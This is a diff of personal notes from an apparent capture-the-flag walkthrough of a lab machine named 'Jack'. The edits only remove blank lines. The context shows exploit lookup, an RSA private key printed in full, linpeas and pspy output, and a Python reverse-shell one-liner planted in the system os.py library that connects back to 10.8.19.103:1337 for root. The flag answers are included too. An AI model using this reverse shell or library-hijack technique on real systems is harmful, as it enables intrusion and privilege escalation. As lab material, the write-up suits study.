@@ -479,7 +479,6 @@ ctrl + shift + left arrow, right arrow, down arrow, up arrow (adjust terminal)
 ctrl + shift + t (open a new tab)
 ctrl + shift + i (open a new terminal)
 
-
 ---
 
 ┌──(kali㉿kali)-[~]
@@ -491,7 +490,6 @@ WordPress Plugin User Role Editor < 4.25 - Privileg | php/webapps/44595.rb
 ---------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 
-
 ┌──(kali㉿kali)-[~]
 └─$ searchsploit -m php/webapps/44595.rb 
   Exploit: WordPress Plugin User Role Editor < 4.25 - Privilege Escalation
@@ -501,7 +499,6 @@ Shellcodes: No Results
  Verified: False
 File Type: Ruby script, ASCII text, with very long lines (987)
 Copied to: /home/kali/44595.rb
-
 
                                                                                       
 ┌──(kali㉿kali)-[~]
@@ -834,7 +831,6 @@ ELkU10cUUB4qGGo5JF7OHeiSAwmcBtdm/qfywIWibUpJaf3JeEQGUn3INMPtV8j4
 ZFqUVe2Jvxq++O6Ub41zUtWINbR5Fxf+kTlJIIwqc6IuzZq+QWXy
 -----END RSA PRIVATE KEY-----
 
-
 ┌──(kali㉿kali)-[~]
 └─$ chmod 600 id_rsa_jack 
                                                                                       
@@ -848,7 +844,6 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
 
 143 packages can be updated.
 92 updates are security updates.
-
 
 Last login: Mon Nov 16 14:27:49 2020 from 10.11.12.223
 jack@jack:~$ id
@@ -876,7 +871,6 @@ gato.jpg                                linpeas.sh         r.elf              wo
 └─$ python3 -m http.server 8000                                                     
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
-
 ack@jack:~/.ssh$ cd ..
 jack@jack:~$ ls
 reminder.txt  user.txt
@@ -895,7 +889,6 @@ linpeas.sh            100%[=======================>] 758.81K   608KB/s    in 1.2
 jack@jack:/tmp$ chmod +x linpeas.sh;./linpeas.sh
 
 jack@jack:/tmp$ ./linpeas.sh 
-
 
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                     ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
@@ -956,7 +949,6 @@ Writable folder: /dev/shm
 [+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
 [+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
 
-
 Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
 
                                         ╔════════════════════╗
@@ -981,7 +973,6 @@ Vulnerable to CVE-2021-4034
 ./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
 ./linpeas.sh: 1197: ./linpeas.sh: 0: not found
 ./linpeas.sh: 1207: ./linpeas.sh: [[: not found
-
 
 ╔══════════╣ PATH
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
@@ -1196,7 +1187,6 @@ dmesg Not Found
    Download URL: https://www.exploit-db.com/download/40003
    Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working
 
-
 ╔══════════╣ Executing Linux Exploit Suggester 2
 ╚ https://github.com/jondonas/linux-exploit-suggester-2
   [1] af_packet
@@ -1208,7 +1198,6 @@ dmesg Not Found
   [3] get_rekt
       CVE-2017-16695
       Source: http://www.exploit-db.com/exploits/45010
-
 
 ╔══════════╣ Protections
 ═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
@@ -1229,7 +1218,6 @@ apparmor module is loaded.
 ╔══════════╣ Container details
 ═╣ Is this a container? ........... No
 ═╣ Any running containers? ........ No
-
 
                           ╔════════════════════════════════════════════════╗
 ══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
@@ -1464,7 +1452,6 @@ org.freedesktop.resolve1               - -               -                (activ
 org.freedesktop.systemd1               1 systemd         root             :1.1          init.scope                -          -                  
 org.freedesktop.timedate1              - -               -                (activatable) -                         -         
 
-
                                         ╔═════════════════════╗
 ════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════
                                         ╚═════════════════════╝
@@ -1500,7 +1487,6 @@ lo        Link encap:Local Loopback
           collisions:0 txqueuelen:1 
           RX bytes:23204 (23.2 KB)  TX bytes:23204 (23.2 KB)
 
-
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
 tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
@@ -1510,8 +1496,6 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 
 ╔══════════╣ Can I sniff with tcpdump?
 No
-
-
 
                                          ╔═══════════════════╗
 ═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════
@@ -1608,8 +1592,6 @@ jack             pts/1    10.8.19.103      Wed Jan 18 15:14:56 -0600 2023
 
 ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
 
-
-
                                        ╔══════════════════════╗
 ═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════
                                        ╚══════════════════════╝
@@ -1676,7 +1658,6 @@ lrwxrwxrwx 1 root root 35 Jan 10  2020 /etc/apache2/sites-enabled/000-default.co
 	CustomLog ${APACHE_LOG_DIR}/access.log combined
 </VirtualHost>
 
-
 -rw-r--r-- 1 root root 1332 Jun 11  2018 /etc/apache2/sites-available/000-default.conf
 <VirtualHost *:80>
 	ServerAdmin webmaster@localhost
@@ -1729,7 +1710,6 @@ pgsql.allow_persistent = On
 	refuse options = checksum dry-run
 	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
 
-
 ╔══════════╣ Analyzing Ldap Files (limit 70)
 The password hash is from the {SSHA} to 'structural'
 drwxr-xr-x 2 root root 4096 Jan  8  2020 /etc/ldap
@@ -1741,7 +1721,6 @@ drwxr-xr-x 2 root root 4096 Jan  9  2020 /usr/share/php7.0-ldap/ldap
 -rw-r--r-- 1 root root 0 Jan  9  2020 /var/lib/php/modules/7.0/cli/enabled_by_maint/ldap
 
 -rw-r--r-- 1 root root 0 Jan  9  2020 /var/lib/php/modules/7.0/registry/ldap
-
 
 ╔══════════╣ Searching ssl/ssh files
 ╔══════════╣ Analyzing SSH Files (limit 70)
@@ -1805,8 +1784,6 @@ ELkU10cUUB4qGGo5JF7OHeiSAwmcBtdm/qfywIWibUpJaf3JeEQGUn3INMPtV8j4
 ZFqUVe2Jvxq++O6Ub41zUtWINbR5Fxf+kTlJIIwqc6IuzZq+QWXy
 -----END RSA PRIVATE KEY-----
 
-
-
 -rw-rw-r-- 1 jack jack 391 Jan 10  2020 /home/jack/.ssh/authorized_keys
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF8FH0X1Xkbaye/VdprG/dUdsVnZVlHAbJT5qHqSiYF5oCV2vxI0rXHTC795eMuOtadVpg4RTZhSsfOf924Hda+bzHIDRPzH9ZtXaixZpU5p+Q9K9ilXg51Ct1GhLc8Q5dGdL4Kc5MCA9ajb7F8fVd6V0XD1eJiumtO6CbAJxgO4FkHevOZYDyw9aMuOzrHM0rbpFBBuj3NrHB8R2Nndqf0meAknubSu0X28p4JF87VXyx3+3WW73oqqfgVlRNdAUQZ8Bi6kbpve+lHCqYjrLZWMrkzGUyYR3A/yjGYpHhdGq9IrXyblvLPxlS7VF8HxSD+kor1VVuT1AVZutXgTcX jack@jack
 
@@ -1834,7 +1811,6 @@ Subsystem	sftp	/usr/lib/openssh/sftp-server
 ══╣ /etc/hosts.allow file found, trying to read the rules:
 /etc/hosts.allow
 
-
 Searching inside /etc/ssh/ssh_config for interesting info
 Host *
     SendEnv LANG LC_*
@@ -1846,21 +1822,14 @@ Host *
 drwxr-xr-x 2 root root 4096 Jan  8  2020 /etc/pam.d
 -rw-r--r-- 1 root root 2133 Jan 31  2019 /etc/pam.d/sshd
 
-
-
-
 ╔══════════╣ Searching tmux sessions
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
 tmux 2.1
-
 
 /tmp/tmux-1000
 ╔══════════╣ Analyzing Keyring Files (limit 70)
 drwxr-xr-x 2 root root 4096 Jan  8  2020 /usr/share/keyrings
 drwxr-xr-x 2 root root 4096 Jan  8  2020 /var/lib/apt/keyrings
-
-
-
 
 ╔══════════╣ Searching uncommon passwd files (splunk)
 passwd file: /etc/pam.d/passwd
@@ -1888,17 +1857,10 @@ netpgp Not Found
 
 drwx------ 2 jack jack 4096 Jan 18 14:53 /home/jack/.gnupg
 
-
 ╔══════════╣ Analyzing FTP Files (limit 70)
-
 
 -rw-r--r-- 1 root root 69 Oct 24  2019 /etc/php/7.0/mods-available/ftp.ini
 -rw-r--r-- 1 root root 69 Oct 24  2019 /usr/share/php7.0-common/common/ftp.ini
-
-
-
-
-
 
 ╔══════════╣ Analyzing Interesting logs Files (limit 70)
 -rw-r----- 1 root adm 417698 Jan 18 15:16 /var/log/apache2/access.log
@@ -1908,72 +1870,16 @@ drwx------ 2 jack jack 4096 Jan 18 14:53 /home/jack/.gnupg
 
 ╔══════════╣ Analyzing Windows Files (limit 70)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 lrwxrwxrwx 1 root root 22 Jan  9  2020 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
 lrwxrwxrwx 1 root root 24 Jan  9  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
 -rw-r--r-- 1 root root 83 Jan  9  2020 /var/lib/dpkg/alternatives/my.cnf
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ╔══════════╣ Analyzing Other Interesting Files (limit 70)
 -rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc
 -rw-r--r-- 1 jack jack 3771 Jan  8  2020 /home/jack/.bashrc
 
-
-
-
-
 -rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
 -rw-r--r-- 1 jack jack 655 Jan  8  2020 /home/jack/.profile
-
-
-
-
-
 
                                          ╔═══════════════════╗
 ═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
@@ -2168,7 +2074,6 @@ drwx------ 2 jack jack 4096 Jan 10  2020 .ssh
 
 ╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
 Found /var/lib/mlocate/mlocate.db: regular file, no read permission
-
 
 ╔══════════╣ Web files?(output limit)
 /var/www/:
@@ -2433,7 +2338,6 @@ Selecting previously unselected package base-passwd.
 Selecting previously unselected package passwd.
 Setting up base-passwd (3.5.39) ...
 
-
 ack@jack:/tmp$ wget http://10.8.19.103:8000/pspy64s
 --2023-01-18 15:24:18--  http://10.8.19.103:8000/pspy64s
 Connecting to 10.8.19.103:8000... connected.
@@ -2447,7 +2351,6 @@ pspy64s                        100%[============================================
 
 jack@jack:/tmp$ chmod +x pspy64s; ./pspy64s
 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
-
 
      ██▓███    ██████  ██▓███ ▓██   ██▓
     ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
@@ -2887,7 +2790,6 @@ Content-Type: text/html; charset=UTF-8
 
 jack@jack:/tmp$ id
 uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
-
 
 jack@jack:/opt/statuscheck$ find / -group family 2>/dev/null
 /usr/lib/python2.7/_threading_local.py
@@ -3423,11 +3325,9 @@ difflib.pyc         logging              pty.pyc                subprocess.py
 dircache.py         _LWPCookieJar.py     pyclbr.py              subprocess.pyc
 dircache.pyc        _LWPCookieJar.pyc    pyclbr.pyc             sunaudio.py
 
-
 jack@jack:/usr/lib/python2.7$ nano os.py
 
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
-
 
     
 ┌──(kali㉿kali)-[~]
@@ -3446,10 +3346,7 @@ root@jack:~# cat root.txt
 cat root.txt
 b8b63a861cc09e853f29d8055d64bffb
 
-
 ```
-
-![[Pasted image 20230118143030.png]]
 
 Gain initial access and obtain the user flag.
 
@@ -3462,6 +3359,5 @@ Escalate your privileges to root. Whats the root flag?
 Python
 
 *b8b63a861cc09e853f29d8055d64bffb*
-
 
 [[Sigma]]
